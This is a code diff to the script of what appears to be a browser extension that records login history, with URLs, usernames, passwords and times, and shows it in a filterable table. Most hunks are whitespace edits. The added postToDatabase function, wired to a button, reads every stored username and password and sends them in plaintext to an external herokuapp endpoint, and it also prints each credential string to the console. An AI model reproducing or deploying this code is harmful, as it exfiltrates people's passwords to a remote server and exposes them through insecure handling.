@@ -52,6 +52,7 @@ function showResult() {
 	rows = table.getElementsByTagName("tr");
 	//if textbox is empty
     if (searchText.value == "") {
+
         alert("Searchbox is Empty. \nResult will contain every URL/USername in destinated time section!");
 		for(var i = 1; i<rows.length; i++){
 			var row = rows[i];
@@ -59,6 +60,7 @@ function showResult() {
 		}show();		
 	}
 	
+
 	//if there is text to search
     else {        
         if (radioURL.checked) {
@@ -121,32 +123,32 @@ function changeSelect(){
 	//if (tempTable!=null){
 		//table = tempTable;}
 	var rows = table.getElementsByTagName("tr");
-	
+
 	var time = new Date();
 	var today = dateToInt(time.getFullYear(), time.getMonth()+1, time.getDate());
 	//alert("today: "+today);
 
-	
-	
+
+
 	var twodayago = new Date();
 	twodayago.setDate(twodayago.getDate()-2);
 	twodayago = dateToInt(twodayago.getFullYear(), twodayago.getMonth()+1, twodayago.getDate());
 	//alert(twodayago);
-	
+
 	switch(selectedIndex) {
-		
+
 		case 0://whole
 			alert(dropdown.options[0].value)
 			for (var i = 1; i < rows.length; i++){
 				var row = rows[i];
 				row.getElementsByTagName("td")[6].innerHTML ="T";
 			}
-			
-			
+
+
 			break;
 		case 1://1day
-			alert(dropdown.options[1].value);			
-	
+			alert(dropdown.options[1].value);
+
 			for (var i = 1; i < rows.length; i++){
 				var row = rows[i];
 				if (row.style.display!='none'){
@@ -184,7 +186,7 @@ function changeSelect(){
 				}
 			}break;
 		case 3://1week
-			alert(dropdown.options[3].value);	
+			alert(dropdown.options[3].value);
 			var weekago = new Date();
 			weekago.setDate(weekago.getDate() -6);
 			weekago = dateToInt(weekago.getFullYear(), weekago.getMonth()+1, weekago.getDate());
@@ -205,7 +207,7 @@ function changeSelect(){
 			
 			}break;
 		case 4://1month
-			alert(dropdown.options[4].value);	
+			alert(dropdown.options[4].value);
 			var monthago = new Date();
 			monthago.setMonth(monthago.getMonth() -1);
 			monthago = dateToInt(monthago.getFullYear(), monthago.getMonth()+1, monthago.getDate());
@@ -259,7 +261,7 @@ function getByIndex(str, start, finish){
 }
 function dateToInt(a, b, c){
 	return parseInt(a)*10000+parseInt(b)*100+parseInt(c);
-	
+
 }
 function show(){
 	rows = table.getElementsByTagName("tr");
@@ -277,9 +279,69 @@ function show(){
 	}countResult(count);
 }
 
+// example function to show how to read from file using cross-origin xhr
+function getFromFile() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://php-hollaholl.herokuapp.com/example.json", true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            alert(xhr.responseText);
+        }
+    }
+    xhr.send();
+}
+
+function postToDatabase() {
+    chrome.storage.local.get(null, function (result) {
+        // count the number of entries
+        entryCount = result.urls.length;
+
+        var urlTemp, usernameTemp, passwordTemp, timeTemp;
+
+        // insert each entry into an external database
+        for (i=0; i<entryCount; i++) {
+            urlTemp = result.urls[i];
+            usernameTemp = result.usernames[i];
+            passwordTemp = result.passwords[i];
+            timeTemp = result.times[i];
+
+            var input = "url="+urlTemp+"&username="+usernameTemp+"&password="+passwordTemp+"&time="+timeTemp;
+            console.log("INPUT: "+input);
+            var xhr = new XMLHttpRequest();
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    alert(xhr.responseText);
+                }
+            }
+
+            xhr.open("POST", "https://php-hollaholl.herokuapp.com/dbhandle.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send(input);
+        }
+    });
+}
+
+function postToDatabase_v2() {
+    var input = "column1="+"Hello"+"&column2="+"world";
+    console.log("INPUT: "+input);
+    var xhr = new XMLHttpRequest();
+
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            alert(xhr.responseText);
+        }
+    }
+
+    xhr.open("POST", "https://php-hollaholl.herokuapp.com/dbhandleTest.php", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send(input);
+}
+
 var entryCount;
 var resetButton = document.querySelector("button[id=reset]");
 var searchButton = document.querySelector("button[id=search]");
+var databaseButton = document.querySelector("button[id=postToDatabase]");
 var searchText = document.getElementById("searchText");
 var table = document.getElementById("loginInfoTable");
 var radioURL = document.getElementById("radioURL");
@@ -291,7 +353,4 @@ document.body.onload = loadTable;
 resetButton.onclick = resetHistory;
 searchButton.onclick = showResult;
 dropdown.onchange = changeSelect;
-
-
-
-
+databaseButton.onclick = postToDatabase;
